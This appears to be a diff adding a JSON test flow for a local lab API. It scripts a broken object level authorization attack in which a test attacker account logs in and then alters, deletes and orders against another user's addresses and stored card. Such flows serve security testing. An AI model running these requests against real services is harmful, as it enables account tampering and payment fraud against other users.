@@ -1,0 +1,74 @@
+{
+    "id": "flow_bola_attacker_modifies_victim_data",
+    "name": "BOLA: Attacker Modifies Victim's Data and Places Order for Victim",
+    "description": "Attacker (GraceWilson) logs in, creates/updates/deletes an address for victim (HenryMoore), and places an order for the victim using victim's details.",
+    "staticVars": {
+      "baseUrl": "http://localhost:8000",
+      "attackerUsername": "GraceWilson",
+      "attackerPassword": "GracePass7&",
+      "victimUserId": "00000009-0000-0000-0000-000000000009",
+      "victimAddressIdToUpdateOrDelete": "ad000009-0001-0000-0000-000000000001",
+      "victimCardIdForOrder": "cc000009-0001-0000-0000-000000000001",
+      "sampleProductId": "f47ac10b-58cc-4372-a567-0e02b2c3d479"
+    },
+    "steps": [
+      {
+        "id": "step_attacker_login_grace_modify",
+        "name": "Attacker (GraceWilson) Logs In",
+        "type": "request",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/auth/login?username={{attackerUsername}}&password={{attackerPassword}}",
+        "onFailure": "stop",
+        "extract": {
+          "attacker_token": "body.access_token"
+        }
+      },
+      {
+        "id": "step_attacker_creates_address_for_victim",
+        "name": "Attacker Creates Address for Victim (HenryMoore)",
+        "type": "request",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/users/{{victimUserId}}/addresses?street=Compromised%20Alley&city=Breachburg&country=Vulnland&zip_code=00000",
+        "headers": {
+          "Authorization": "Bearer {{attacker_token}}"
+        },
+        "onFailure": "stop",
+        "extract": {
+          "newly_created_victim_address_id": "body.address_id"
+        }
+      },
+      {
+        "id": "step_attacker_updates_victim_address",
+        "name": "Attacker Updates Victim's (HenryMoore) Existing Address",
+        "type": "request",
+        "method": "PUT",
+        "url": "{{baseUrl}}/api/users/{{victimUserId}}/addresses/{{victimAddressIdToUpdateOrDelete}}?city=PwnedCity&is_default=true",
+        "headers": {
+          "Authorization": "Bearer {{attacker_token}}"
+        },
+        "onFailure": "stop"
+      },
+      {
+        "id": "step_attacker_places_order_for_victim",
+        "name": "Attacker Places Order for Victim (HenryMoore) using Victim's Address/Card",
+        "type": "request",
+        "method": "POST",
+        "url": "{{baseUrl}}/api/users/{{victimUserId}}/orders?address_id={{victimAddressIdToUpdateOrDelete}}&credit_card_id={{victimCardIdForOrder}}&product_id_1={{sampleProductId}}&quantity_1=1",
+        "headers": {
+          "Authorization": "Bearer {{attacker_token}}"
+        },
+        "onFailure": "stop"
+      },
+      {
+        "id": "step_attacker_deletes_victim_address",
+        "name": "Attacker Deletes Victim's (HenryMoore) Newly Created Address",
+        "type": "request",
+        "method": "DELETE",
+        "url": "{{baseUrl}}/api/users/{{victimUserId}}/addresses/{{newly_created_victim_address_id}}",
+        "headers": {
+          "Authorization": "Bearer {{attacker_token}}"
+        },
+        "onFailure": "stop"
+      }
+    ]
+  }
